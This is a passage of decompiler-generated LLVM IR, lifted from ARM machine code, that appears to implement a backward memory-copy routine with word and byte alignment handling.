  store i32 %v6_17628, i32* %r4.global-to-local, align 4
  %v7_17628 = add i32 %v0_17628, -12
  %v8_17628 = inttoptr i32 %v7_17628 to i32*
  %v9_17628 = load i32, i32* %v8_17628, align 4
  store i32 %v9_17628, i32* %ip.global-to-local, align 4
  %v10_17628 = add i32 %v0_17628, -16
  %v11_17628 = inttoptr i32 %v10_17628 to i32*
  %v12_17628 = load i32, i32* %v11_17628, align 4
  store i32 %v12_17628, i32* %lr.global-to-local, align 4
  store i32 %v10_17628, i32* %r1.global-to-local, align 4
  %v1_1762c = add i32 %v0_1762c, -16
  %v2_1762c = inttoptr i32 %v1_1762c to i32*
  store i32 %v3_17628, i32* %v2_1762c, align 4
  %v4_1762c = add i32 %v0_1762c, -12
  %v5_1762c = inttoptr i32 %v4_1762c to i32*
  %v6_1762c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_1762c, i32* %v5_1762c, align 4
  %v7_1762c = add i32 %v0_1762c, -8
  %v8_1762c = inttoptr i32 %v7_1762c to i32*
  %v9_1762c = load i32, i32* %ip.global-to-local, align 4
  store i32 %v9_1762c, i32* %v8_1762c, align 4
  %v10_1762c = add i32 %v0_1762c, -4
  %v11_1762c = inttoptr i32 %v10_1762c to i32*
  %v12_1762c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_1762c, i32* %v11_1762c, align 4
  store i32 %v1_1762c, i32* %r0.global-to-local, align 4
  %v0_17630 = load i32, i32* %r1.global-to-local, align 4
  %v1_17630 = add i32 %v0_17630, -4
  %v2_17630 = inttoptr i32 %v1_17630 to i32*
  %v3_17630 = load i32, i32* %v2_17630, align 4
  store i32 %v3_17630, i32* @r3, align 4
  %v4_17630 = add i32 %v0_17630, -8
  %v5_17630 = inttoptr i32 %v4_17630 to i32*
  %v6_17630 = load i32, i32* %v5_17630, align 4
  store i32 %v6_17630, i32* %r4.global-to-local, align 4
  %v7_17630 = add i32 %v0_17630, -12
  %v8_17630 = inttoptr i32 %v7_17630 to i32*
  %v9_17630 = load i32, i32* %v8_17630, align 4
  store i32 %v9_17630, i32* @ip, align 4
  %v10_17630 = add i32 %v0_17630, -16
  %v11_17630 = inttoptr i32 %v10_17630 to i32*
  %v12_17630 = load i32, i32* %v11_17630, align 4
  store i32 %v12_17630, i32* %lr.global-to-local, align 4
  store i32 %v10_17630, i32* %r1.global-to-local, align 4
  %v1_17634 = add i32 %v0_1762c, -32
  %v2_17634 = inttoptr i32 %v1_17634 to i32*
  store i32 %v3_17630, i32* %v2_17634, align 4
  %v4_17634 = add i32 %v0_1762c, -28
  %v5_17634 = inttoptr i32 %v4_17634 to i32*
  %v6_17634 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_17634, i32* %v5_17634, align 4
  %v7_17634 = add i32 %v0_1762c, -24
  %v8_17634 = inttoptr i32 %v7_17634 to i32*
  %v9_17634 = load i32, i32* @ip, align 4
  store i32 %v9_17634, i32* %v8_17634, align 4
  %v10_17634 = add i32 %v0_1762c, -20
  %v11_17634 = inttoptr i32 %v10_17634 to i32*
  %v12_17634 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_17634, i32* %v11_17634, align 4
  store i32 %v1_17634, i32* %r0.global-to-local, align 4
  %v0_17638 = load i32, i32* %r2.global-to-local, align 4
  %v2_17638 = add i32 %v0_17638, -32
  store i32 %v2_17638, i32* %r2.global-to-local, align 4
  %v6_1763c = icmp slt i32 %v0_17638, 32
  br i1 %v6_1763c, label %dec_label_pc_17640.loopexit, label %dec_label_pc_17628.dec_label_pc_17628_crit_edge

dec_label_pc_17628.dec_label_pc_17628_crit_edge:  ; preds = %dec_label_pc_17628
  %v0_17628.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_17628

dec_label_pc_17640.loopexit:                      ; preds = %dec_label_pc_17628
  %v4_17638 = sub i32 31, %v0_17638
  %v5_17638 = and i32 %v4_17638, %v0_17638
  %v6_17638 = icmp slt i32 %v5_17638, 0
  %v7_17638 = icmp slt i32 %v2_17638, 0
  store i1 %v6_17638, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_17638, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_17640

dec_label_pc_17640:                               ; preds = %dec_label_pc_17640.loopexit, %dec_label_pc_1761c
  %v6_17648 = phi i32 [ %v1_17634, %dec_label_pc_17640.loopexit ], [ %v0_1762c37, %dec_label_pc_1761c ]
  %v0_17650.pr = phi i32 [ %v2_17638, %dec_label_pc_17640.loopexit ], [ %v2_17620, %dec_label_pc_1761c ]
  %v4_17640 = add i32 %v0_17650.pr, 16
  %v6_17640 = sub i32 0, %v0_17650.pr
  %v7_17640 = and i32 %v4_17640, %v6_17640
  %v8_17640 = icmp slt i32 %v7_17640, 0
  store i1 %v8_17640, i1* %cpsr_v.global-to-local, align 1
  %v9_17640 = icmp slt i32 %v4_17640, 0
  store i1 %v9_17640, i1* %cpsr_n.global-to-local, align 1
  %v10_17640 = icmp eq i32 %v4_17640, 0
  store i1 %v10_17640, i1* %cpsr_z.global-to-local, align 1
  %v5_17644 = icmp slt i32 %v0_17650.pr, -16
  br i1 %v5_17644, label %.thread2, label %bb147

bb147:                                            ; preds = %dec_label_pc_17640
  %v6_17644 = load i32, i32* %r1.global-to-local, align 4
  %v7_17644 = add i32 %v6_17644, -4
  %v8_17644 = inttoptr i32 %v7_17644 to i32*
  %v9_17644 = load i32, i32* %v8_17644, align 4
  store i32 %v9_17644, i32* @r3, align 4
  %v10_17644 = add i32 %v6_17644, -8
  %v11_17644 = inttoptr i32 %v10_17644 to i32*
  %v12_17644 = load i32, i32* %v11_17644, align 4
  store i32 %v12_17644, i32* %r4.global-to-local, align 4
  %v13_17644 = add i32 %v6_17644, -12
  %v14_17644 = inttoptr i32 %v13_17644 to i32*
  %v15_17644 = load i32, i32* %v14_17644, align 4
  store i32 %v15_17644, i32* @ip, align 4
  %v16_17644 = add i32 %v6_17644, -16
  %v17_17644 = inttoptr i32 %v16_17644 to i32*
  %v18_17644 = load i32, i32* %v17_17644, align 4
  store i32 %v18_17644, i32* %lr.global-to-local, align 4
  store i32 %v16_17644, i32* %r1.global-to-local, align 4
  %v7_17648 = add i32 %v6_17648, -16
  %v8_17648 = inttoptr i32 %v7_17648 to i32*
  store i32 %v9_17644, i32* %v8_17648, align 4
  %v10_17648 = add i32 %v6_17648, -12
  %v11_17648 = inttoptr i32 %v10_17648 to i32*
  %v12_17648 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v12_17648, i32* %v11_17648, align 4
  %v13_17648 = add i32 %v6_17648, -8
  %v14_17648 = inttoptr i32 %v13_17648 to i32*
  %v15_17648 = load i32, i32* @ip, align 4
  store i32 %v15_17648, i32* %v14_17648, align 4
  %v16_17648 = add i32 %v6_17648, -4
  %v17_17648 = inttoptr i32 %v16_17648 to i32*
  %v18_17648 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v18_17648, i32* %v17_17648, align 4
  store i32 %v7_17648, i32* %r0.global-to-local, align 4
  %v6_1764c = load i32, i32* %r2.global-to-local, align 4
  %v7_1764c = add i32 %v6_1764c, -16
  store i32 %v7_1764c, i32* %r2.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_17640, %bb147
  %v6_17658 = phi i32 [ %v7_17648, %bb147 ], [ %v6_17648, %dec_label_pc_17640 ]
  %v0_17650 = phi i32 [ %v7_1764c, %bb147 ], [ %v0_17650.pr, %dec_label_pc_17640 ]
  %v4_17650 = add i32 %v0_17650, 20
  store i32 %v4_17650, i32* %r2.global-to-local, align 4
  %v6_17650 = sub i32 0, %v0_17650
  %v7_17650 = and i32 %v4_17650, %v6_17650
  %v8_17650 = icmp slt i32 %v7_17650, 0
  store i1 %v8_17650, i1* %cpsr_v.global-to-local, align 1
  %v9_17650 = icmp slt i32 %v4_17650, 0
  store i1 %v9_17650, i1* %cpsr_n.global-to-local, align 1
  %v10_17650 = icmp eq i32 %v4_17650, 0
  store i1 %v10_17650, i1* %cpsr_z.global-to-local, align 1
  %v5_17654 = icmp slt i32 %v0_17650, -20
  br i1 %v5_17654, label %.thread4, label %bb148

bb148:                                            ; preds = %.thread2
  %v6_17654 = load i32, i32* %r1.global-to-local, align 4
  %v7_17654 = add i32 %v6_17654, -4
  %v8_17654 = inttoptr i32 %v7_17654 to i32*
  %v9_17654 = load i32, i32* %v8_17654, align 4
  store i32 %v9_17654, i32* @r3, align 4
  %v10_17654 = add i32 %v6_17654, -8
  %v11_17654 = inttoptr i32 %v10_17654 to i32*
  %v12_17654 = load i32, i32* %v11_17654, align 4
  store i32 %v12_17654, i32* @ip, align 4
  %v13_17654 = add i32 %v6_17654, -12
  %v14_17654 = inttoptr i32 %v13_17654 to i32*
  %v15_17654 = load i32, i32* %v14_17654, align 4
  store i32 %v15_17654, i32* %lr.global-to-local, align 4
  store i32 %v13_17654, i32* %r1.global-to-local, align 4
  %v7_17658 = add i32 %v6_17658, -12
  %v8_17658 = inttoptr i32 %v7_17658 to i32*
  store i32 %v9_17654, i32* %v8_17658, align 4
  %v10_17658 = add i32 %v6_17658, -8
  %v11_17658 = inttoptr i32 %v10_17658 to i32*
  %v12_17658 = load i32, i32* @ip, align 4
  store i32 %v12_17658, i32* %v11_17658, align 4
  %v13_17658 = add i32 %v6_17658, -4
  %v14_17658 = inttoptr i32 %v13_17658 to i32*
  %v15_17658 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v15_17658, i32* %v14_17658, align 4
  store i32 %v7_17658, i32* %r0.global-to-local, align 4
  %v6_1765c = load i32, i32* %r2.global-to-local, align 4
  %v7_1765c = add i32 %v6_1765c, -12
  store i32 %v7_1765c, i32* %r2.global-to-local, align 4
  br label %.thread4

.thread4:                                         ; preds = %.thread2, %bb148
  %v6_1767c45 = phi i32 [ %v6_17658, %.thread2 ], [ %v7_17658, %bb148 ]
  %v0_1766443 = phi i32 [ %v4_17650, %.thread2 ], [ %v7_1765c, %bb148 ]
  %v2_17660 = load i8*, i8** %stack_var_-8, align 4
  %v3_17660 = ptrtoint i8* %v2_17660 to i32
  store i32 %v3_17660, i32* @r4, align 4
  store i32 %v8_1761c, i32* @lr, align 4
  br label %dec_label_pc_17664

dec_label_pc_17664:                               ; preds = %dec_label_pc_17614, %.thread4
  %v7_17674 = phi i32 [ %v0_1762c37, %dec_label_pc_17614 ], [ %v6_1767c45, %.thread4 ]
  %v0_17664 = phi i32 [ %v2_17614, %dec_label_pc_17614 ], [ %v0_1766443, %.thread4 ]
  %v2_17664 = add i32 %v0_17664, 8
  store i32 %v2_17664, i32* %r2.global-to-local, align 4
  %v4_17664 = sub i32 0, %v0_17664
  %v5_17664 = and i32 %v2_17664, %v4_17664
  %v6_17664 = icmp slt i32 %v5_17664, 0
  store i1 %v6_17664, i1* %cpsr_v.global-to-local, align 1
  %v7_17664 = icmp slt i32 %v2_17664, 0
  store i1 %v7_17664, i1* %cpsr_n.global-to-local, align 1
  %v8_17664 = icmp eq i32 %v2_17664, 0
  store i1 %v8_17664, i1* %cpsr_z.global-to-local, align 1
  %v5_17668 = icmp slt i32 %v0_17664, -8
  br i1 %v5_17668, label %bb150, label %dec_label_pc_1766c

dec_label_pc_1766c:                               ; preds = %dec_label_pc_17664
  %v6_1766c = add i32 %v0_17664, 4
  store i32 %v6_1766c, i32* %r2.global-to-local, align 4
  %v8_1766c = sub i32 -5, %v0_17664
  %v9_1766c = and i32 %v8_1766c, %v2_17664
  %v10_1766c = icmp slt i32 %v9_1766c, 0
  store i1 %v10_1766c, i1* %cpsr_v.global-to-local, align 1
  %v11_1766c = icmp slt i32 %v6_1766c, 0
  store i1 %v11_1766c, i1* %cpsr_n.global-to-local, align 1
  %v12_1766c = icmp eq i32 %v2_17664, 4
  store i1 %v12_1766c, i1* %cpsr_z.global-to-local, align 1
  %v5_17670 = icmp slt i32 %v2_17664, 4
  %v6_17670 = load i32, i32* %r1.global-to-local, align 4
  %v7_17670 = add i32 %v6_17670, -4
  %v8_17670 = inttoptr i32 %v7_17670 to i32*
  %v9_17670 = load i32, i32* %v8_17670, align 4
  store i32 %v9_17670, i32* @r3, align 4
  br i1 %v5_17670, label %.thread8, label %bb149

.thread8:                                         ; preds = %dec_label_pc_1766c
  store i32 %v7_17670, i32* %r1.global-to-local, align 4
  %v8_17674 = add i32 %v7_17674, -4
  %v9_17674 = inttoptr i32 %v8_17674 to i32*
  store i32 %v9_17670, i32* %v9_17674, align 4
  %v10_17674 = load i32, i32* %r0.global-to-local, align 4
  %v11_17674 = add i32 %v10_17674, -4
  store i32 %v11_17674, i32* %r0.global-to-local, align 4
  %v0_17684.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb150

bb149:                                            ; preds = %dec_label_pc_1766c
  %v10_17678 = add i32 %v6_17670, -8
  %v11_17678 = inttoptr i32 %v10_17678 to i32*
  %v12_17678 = load i32, i32* %v11_17678, align 4
  store i32 %v12_17678, i32* @ip, align 4
  store i32 %v10_17678, i32* %r1.global-to-local, align 4
  %v7_1767c = add i32 %v7_17674, -8
  %v8_1767c = inttoptr i32 %v7_1767c to i32*
  store i32 %v9_17670, i32* %v8_1767c, align 4
  %v10_1767c = add i32 %v7_17674, -4
  %v11_1767c = inttoptr i32 %v10_1767c to i32*
  %v12_1767c = load i32, i32* @ip, align 4
  store i32 %v12_1767c, i32* %v11_1767c, align 4
  store i32 %v7_1767c, i32* %r0.global-to-local, align 4
  %v6_17680 = load i32, i32* %r2.global-to-local, align 4
  %v7_17680 = add i32 %v6_17680, -4
  store i32 %v7_17680, i32* %r2.global-to-local, align 4
  br label %bb150

bb150:                                            ; preds = %.thread8, %.thread14, %dec_label_pc_17664, %dec_label_pc_175f4, %dec_label_pc_17828, %dec_label_pc_177bc, %dec_label_pc_17750, %bb149
  %v2_17688 = phi i32 [ %v11_17674, %.thread8 ], [ %v0_1772020, %.thread14 ], [ %v7_17674, %dec_label_pc_17664 ], [ %v2_175f8, %dec_label_pc_175f4 ], [ %v2_1769453, %dec_label_pc_17828 ], [ %v2_1769452, %dec_label_pc_177bc ], [ %v2_1769451, %dec_label_pc_17750 ], [ %v7_1767c, %bb149 ]
  %v0_17684 = phi i32 [ %v0_17684.pre, %.thread8 ], [ %v2_176c8, %.thread14 ], [ %v2_17664, %dec_label_pc_17664 ], [ %v2_175fc, %dec_label_pc_175f4 ], [ %v0_1768449, %dec_label_pc_17828 ], [ %v0_1768448, %dec_label_pc_177bc ], [ %v0_1768447, %dec_label_pc_17750 ], [ %v7_17680, %bb149 ]
  %v1_17684 = add i32 %v0_17684, 4
  store i32 %v1_17684, i32* %r2.global-to-local, align 4
  %v3_17684 = sub i32 0, %v0_17684
  %v4_17684 = and i32 %v1_17684, %v3_17684
  %v5_17684 = icmp slt i32 %v4_17684, 0
  store i1 %v5_17684, i1* %cpsr_v.global-to-local, align 1
  %v6_17684 = icmp slt i32 %v1_17684, 0
  store i1 %v6_17684, i1* %cpsr_n.global-to-local, align 1
  %v7_17684 = icmp eq i32 %v1_17684, 0
  store i1 %v7_17684, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_17684, label %.thread130, label %bb151

bb151:                                            ; preds = %bb150
  %v1_1768c = add i32 %v0_17684, 2
  %v3_1768c = sub i32 -3, %v0_17684
  %v4_1768c = and i32 %v3_1768c, %v1_17684
  %v5_1768c = icmp slt i32 %v4_1768c, 0
  store i1 %v5_1768c, i1* %cpsr_v.global-to-local, align 1
  %v6_1768c = icmp slt i32 %v1_1768c, 0
  store i1 %v6_1768c, i1* %cpsr_n.global-to-local, align 1
  %v7_1768c = icmp eq i32 %v1_17684, 2
  store i1 %v7_1768c, i1* %cpsr_z.global-to-local, align 1
  %v0_17690 = load i32, i32* %r1.global-to-local, align 4
  %v1_17690 = add i32 %v0_17690, -1
  %v2_17690 = inttoptr i32 %v1_17690 to i8*
  %v3_17690 = load i8, i8* %v2_17690, align 1
  %v4_17690 = zext i8 %v3_17690 to i32
  store i32 %v4_17690, i32* @r3, align 4
  store i32 %v1_17690, i32* %r1.global-to-local, align 4
  %v3_17694 = add i32 %v2_17688, -1
  %v4_17694 = inttoptr i32 %v3_17694 to i8*
  store i8 %v3_17690, i8* %v4_17694, align 1
  %v5_17694 = load i32, i32* %r0.global-to-local, align 4
  %v6_17694 = add i32 %v5_17694, -1
  store i32 %v6_17694, i32* %r0.global-to-local, align 4
  %v0_17698 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_17698 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_17698 = xor i1 %v0_17698, %v1_17698
  br i1 %v2_17698, label %.thread129, label %bb152

bb152:                                            ; preds = %bb151
  %v3_17698 = load i32, i32* %r1.global-to-local, align 4
  %v4_17698 = add i32 %v3_17698, -1
  %v5_17698 = inttoptr i32 %v4_17698 to i8*
  %v6_17698 = load i8, i8* %v5_17698, align 1
  %v7_17698 = zext i8 %v6_17698 to i32
  store i32 %v7_17698, i32* @r3, align 4
  store i32 %v4_17698, i32* %r1.global-to-local, align 4
  %v6_1769c = add i32 %v5_17694, -2
  %v7_1769c = inttoptr i32 %v6_1769c to i8*
  store i8 %v6_17698, i8* %v7_1769c, align 1
  %v8_1769c = load i32, i32* %r0.global-to-local, align 4
  %v9_1769c = add i32 %v8_1769c, -1
  store i32 %v9_1769c, i32* %r0.global-to-local, align 4
  %v1_176a0.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_176a0.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread129

.thread129:                                       ; preds = %bb151, %bb152
  %v7_176a4 = phi i32 [ %v9_1769c, %bb152 ], [ %v6_17694, %bb151 ]
  %v2_176a4 = phi i1 [ %v2_176a0.pre, %bb152 ], [ %v1_17698, %bb151 ]
  %v1_176a4 = phi i1 [ %v1_176a0.pre, %bb152 ], [ %v0_17698, %bb151 ]
  %v0_176a0 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_176a0 = xor i1 %v2_176a4, %v1_176a4
  %v4_176a0 = or i1 %v0_176a0, %v3_176a0
  br i1 %v4_176a0, label %.thread130, label %bb153

bb153:                                            ; preds = %.thread129
  %v5_176a0 = load i32, i32* %r1.global-to-local, align 4
  %v6_176a0 = add i32 %v5_176a0, -1
  %v7_176a0 = inttoptr i32 %v6_176a0 to i8*
  %v8_176a0 = load i8, i8* %v7_176a0, align 1
  %v9_176a0 = zext i8 %v8_176a0 to i32
  store i32 %v9_176a0, i32* @r3, align 4
  store i32 %v6_176a0, i32* %r1.global-to-local, align 4
  %v8_176a4 = add i32 %v7_176a4, -1
  %v9_176a4 = inttoptr i32 %v8_176a4 to i8*
  store i8 %v8_176a0, i8* %v9_176a4, align 1
  %v10_176a4 = load i32, i32* %r0.global-to-local, align 4
  %v11_176a4 = add i32 %v10_176a4, -1
  store i32 %v11_176a4, i32* %r0.global-to-local, align 4
  br label %.thread130

dec_label_pc_176ac:                               ; preds = %dec_label_pc_17604
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v8_176ac = icmp eq i32 %v1_17604, 1
  store i1 %v8_176ac, i1* %cpsr_n.global-to-local, align 1
  %v9_176ac = icmp eq i32 %v1_17604, 2
  store i1 %v9_176ac, i1* %cpsr_z.global-to-local, align 1
  %v1_176b0 = add i32 %v2_175f4, -1
  %v2_176b0 = inttoptr i32 %v1_176b0 to i8*
  %v3_176b0 = load i8, i8* %v2_176b0, align 1
  %v4_176b0 = zext i8 %v3_176b0 to i32
  store i32 %v4_176b0, i32* @r3, align 4
  store i32 %v1_176b0, i32* %r1.global-to-local, align 4
  %v3_176b4 = add i32 %v2_175f8, -1
  %v4_176b4 = inttoptr i32 %v3_176b4 to i8*
  store i8 %v3_176b0, i8* %v4_176b4, align 1
  %v5_176b4 = load i32, i32* %r0.global-to-local, align 4
  %v6_176b4 = add i32 %v5_176b4, -1
  store i32 %v6_176b4, i32* %r0.global-to-local, align 4
  br i1 %v8_176ac, label %.thread14, label %bb154

bb154:                                            ; preds = %dec_label_pc_176ac
  %v6_176b8 = load i32, i32* %r1.global-to-local, align 4
  %v7_176b8 = add i32 %v6_176b8, -1
  %v8_176b8 = inttoptr i32 %v7_176b8 to i8*
  %v9_176b8 = load i8, i8* %v8_176b8, align 1
  %v10_176b8 = zext i8 %v9_176b8 to i32
  store i32 %v10_176b8, i32* @r3, align 4
  store i32 %v7_176b8, i32* %r1.global-to-local, align 4
  %v9_176bc = add i32 %v5_176b4, -2
  %v10_176bc = inttoptr i32 %v9_176bc to i8*
  store i8 %v9_176b8, i8* %v10_176bc, align 1
  %v11_176bc = load i32, i32* %r0.global-to-local, align 4
  %v12_176bc = add i32 %v11_176bc, -1
  store i32 %v12_176bc, i32* %r0.global-to-local, align 4
  br i1 %v9_176ac, label %.thread14, label %bb155

bb155:                                            ; preds = %bb154
  %v8_176c0 = load i32, i32* %r1.global-to-local, align 4
  %v9_176c0 = add i32 %v8_176c0, -1
  %v10_176c0 = inttoptr i32 %v9_176c0 to i8*
  %v11_176c0 = load i8, i8* %v10_176c0, align 1
  %v12_176c0 = zext i8 %v11_176c0 to i32
  store i32 %v12_176c0, i32* @r3, align 4
  store i32 %v9_176c0, i32* %r1.global-to-local, align 4
  %v11_176c4 = add i32 %v11_176bc, -2
  %v12_176c4 = inttoptr i32 %v11_176c4 to i8*
  store i8 %v11_176c0, i8* %v12_176c4, align 1
  %v13_176c4 = load i32, i32* %r0.global-to-local, align 4
  %v14_176c4 = add i32 %v13_176c4, -1
  store i32 %v14_176c4, i32* %r0.global-to-local, align 4
  br label %.thread14

.thread14:                                        ; preds = %bb154, %dec_label_pc_176ac, %bb155
  %v0_1772020 = phi i32 [ %v12_176bc, %bb154 ], [ %v6_176b4, %dec_label_pc_176ac ], [ %v14_176c4, %bb155 ]
  %v0_176c8 = load i32, i32* %r2.global-to-local, align 4
  %v1_176c8 = load i32, i32* @ip, align 4
  %v2_176c8 = sub i32 %v0_176c8, %v1_176c8
  store i32 %v2_176c8, i32* %r2.global-to-local, align 4
  %v4_176c8 = xor i32 %v1_176c8, %v0_176c8
  %v5_176c8 = xor i32 %v2_176c8, %v0_176c8
  %v6_176c8 = and i32 %v5_176c8, %v4_176c8
  %v7_176c8 = icmp slt i32 %v6_176c8, 0
  store i1 %v7_176c8, i1* %cpsr_v.global-to-local, align 1
  %v8_176c8 = icmp slt i32 %v2_176c8, 0
  store i1 %v8_176c8, i1* %cpsr_n.global-to-local, align 1
  %v9_176c8 = icmp eq i32 %v0_176c8, %v1_176c8
  store i1 %v9_176c8, i1* %cpsr_z.global-to-local, align 1
  %v5_176cc = icmp slt i32 %v0_176c8, %v1_176c8
  br i1 %v5_176cc, label %bb150, label %dec_label_pc_176d0

dec_label_pc_176d0:                               ; preds = %.thread14
  %v0_176d0 = load i32, i32* %r1.global-to-local, align 4
  %v1_176d0 = urem i32 %v0_176d0, 4
  store i32 %v1_176d0, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_176d0 = icmp eq i32 %v1_176d0, 0
  store i1 %v2_176d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_176d0, label %dec_label_pc_17614, label %dec_label_pc_176d8

dec_label_pc_176d8:                               ; preds = %dec_label_pc_1760c, %dec_label_pc_176d0
  %v0_1772019 = phi i32 [ %v2_175f8, %dec_label_pc_1760c ], [ %v0_1772020, %dec_label_pc_176d0 ]
  %v0_177cc = phi i32 [ %v2_175fc, %dec_label_pc_1760c ], [ %v2_176c8, %dec_label_pc_176d0 ]
  %v0_176d8 = phi i32 [ %v2_175f4, %dec_label_pc_1760c ], [ %v0_176d0, %dec_label_pc_176d0 ]
  %v0_176e0 = phi i32 [ %v1_1760c, %dec_label_pc_1760c ], [ %v1_176d0, %dec_label_pc_176d0 ]
  %v1_176d8 = and i32 %v0_176d8, -4
  store i32 %v1_176d8, i32* %r1.global-to-local, align 4
  %v1_176dc = inttoptr i32 %v1_176d8 to i32*
  %v2_176dc = load i32, i32* %v1_176dc, align 4
  store i32 %v2_176dc, i32* @r3, align 4
  %v7_176e0 = icmp ult i32 %v0_176e0, 2
  %v2_177c4 = add i32 %v0_177cc, -12
  %v4_177c4 = sub i32 11, %v0_177cc
  %v5_177c4 = and i32 %v4_177c4, %v0_177cc
  %v6_177c4 = icmp slt i32 %v5_177c4, 0
  store i1 %v6_177c4, i1* %cpsr_v.global-to-local, align 1
  %v7_177c4 = icmp slt i32 %v2_177c4, 0
  store i1 %v7_177c4, i1* %cpsr_n.global-to-local, align 1
  %v8_177c4 = icmp eq i32 %v0_177cc, 12
  store i1 %v8_177c4, i1* %cpsr_z.global-to-local, align 1
  %v5_177c8 = icmp slt i32 %v0_177cc, 12
  br i1 %v7_176e0, label %dec_label_pc_177c4, label %dec_label_pc_176e8

dec_label_pc_176e8:                               ; preds = %dec_label_pc_176d8
  %v8_176e0 = icmp eq i32 %v0_176e0, 2
  br i1 %v8_176e0, label %dec_label_pc_17758, label %dec_label_pc_176ec

dec_label_pc_176ec:                               ; preds = %dec_label_pc_176e8
  br i1 %v5_177c8, label %dec_label_pc_17738, label %dec_label_pc_176f4

dec_label_pc_176f4:                               ; preds = %dec_label_pc_176ec
  store i32 %v2_177c4, i32* %r2.global-to-local, align 4
  %v3_176f8 = load i32, i32* @r4, align 4
  store i32 %v3_176f8, i32* %stack_var_-12, align 4
  %v6_176f8 = load i32, i32* @r5, align 4
  %v8_176f8 = inttoptr i32 %v6_176f8 to i8*
  store i8* %v8_176f8, i8** %stack_var_-8, align 4
  %v11_176f8 = load i32, i32* @lr, align 4
  br label %dec_label_pc_176fc

dec_label_pc_176fc:                               ; preds = %dec_label_pc_176fc.dec_label_pc_176fc_crit_edge, %dec_label_pc_176f4
  %v0_17720 = phi i32 [ %v1_17720, %dec_label_pc_176fc.dec_label_pc_176fc_crit_edge ], [ %v0_1772019, %dec_label_pc_176f4 ]
  %v0_17700 = phi i32 [ %v0_17700.pre, %dec_label_pc_176fc.dec_label_pc_176fc_crit_edge ], [ %v1_176d8, %dec_label_pc_176f4 ]
  %v0_176fc = phi i32 [ %v0_176fc.pre, %dec_label_pc_176fc.dec_label_pc_176fc_crit_edge ], [ %v2_176dc, %dec_label_pc_176f4 ]
  %v3_176fc = mul i32 %v0_176fc, 256
  store i32 %v3_176fc, i32* %lr.global-to-local, align 4
  %v1_17700 = add i32 %v0_17700, -4
  %v2_17700 = inttoptr i32 %v1_17700 to i32*
  %v3_17700 = load i32, i32* %v2_17700, align 4
  store i32 %v3_17700, i32* @r3, align 4
  %v4_17700 = add i32 %v0_17700, -8
  %v5_17700 = inttoptr i32 %v4_17700 to i32*
  %v6_17700 = load i32, i32* %v5_17700, align 4
  store i32 %v6_17700, i32* %r4.global-to-local, align 4
  %v7_17700 = add i32 %v0_17700, -12
  %v8_17700 = inttoptr i32 %v7_17700 to i32*
  %v9_17700 = load i32, i32* %v8_17700, align 4
  store i32 %v9_17700, i32* %r5.global-to-local, align 4
  %v10_17700 = add i32 %v0_17700, -16
  %v11_17700 = inttoptr i32 %v10_17700 to i32*
  %v12_17700 = load i32, i32* %v11_17700, align 4
  store i32 %v10_17700, i32* %r1.global-to-local, align 4
  %v4_17704 = udiv i32 %v12_17700, 16777216
  %v5_17704 = or i32 %v4_17704, %v3_176fc
  store i32 %v5_17704, i32* %lr.global-to-local, align 4
  %v3_17708 = mul i32 %v12_17700, 256
  %v4_1770c = udiv i32 %v9_17700, 16777216
  %v5_1770c = or i32 %v3_17708, %v4_1770c
  store i32 %v5_1770c, i32* @ip, align 4
  %v3_17710 = mul i32 %v9_17700, 256
  %v4_17714 = udiv i32 %v6_17700, 16777216
  %v5_17714 = or i32 %v3_17710, %v4_17714
  store i32 %v5_17714, i32* %r5.global-to-local, align 4
  %v3_17718 = mul i32 %v6_17700, 256
  %v4_1771c = udiv i32 %v3_17700, 16777216
  %v5_1771c = or i32 %v3_17718, %v4_1771c
  store i32 %v5_1771c, i32* %r4.global-to-local, align 4
  %v1_17720 = add i32 %v0_17720, -16
  %v2_17720 = inttoptr i32 %v1_17720 to i32*
  store i32 %v5_1771c, i32* %v2_17720, align 4
  %v4_17720 = add i32 %v0_17720, -12
  %v5_17720 = inttoptr i32 %v4_17720 to i32*
  %v6_17720 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_17720, i32* %v5_17720, align 4
  %v7_17720 = add i32 %v0_17720, -8
  %v8_17720 = inttoptr i32 %v7_17720 to i32*
  %v9_17720 = load i32, i32* @ip, align 4
  store i32 %v9_17720, i32* %v8_17720, align 4
  %v10_17720 = add i32 %v0_17720, -4
  %v11_17720 = inttoptr i32 %v10_17720 to i32*
  %v12_17720 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_17720, i32* %v11_17720, align 4
  store i32 %v1_17720, i32* %r0.global-to-local, align 4
  %v0_17724 = load i32, i32* %r2.global-to-local, align 4
  %v2_17724 = add i32 %v0_17724, -16
  store i32 %v2_17724, i32* %r2.global-to-local, align 4
  %v6_17728 = icmp slt i32 %v0_17724, 16
  br i1 %v6_17728, label %dec_label_pc_1772c, label %dec_label_pc_176fc.dec_label_pc_176fc_crit_edge

dec_label_pc_176fc.dec_label_pc_176fc_crit_edge:  ; preds = %dec_label_pc_176fc
  %v0_176fc.pre = load i32, i32* @r3, align 4
  %v0_17700.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_176fc

dec_label_pc_1772c:                               ; preds = %dec_label_pc_176fc
  %v2_1772c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1772c, i32* @r4, align 4
  %v5_1772c = load i8*, i8** %stack_var_-8, align 4
  %v6_1772c = ptrtoint i8* %v5_1772c to i32
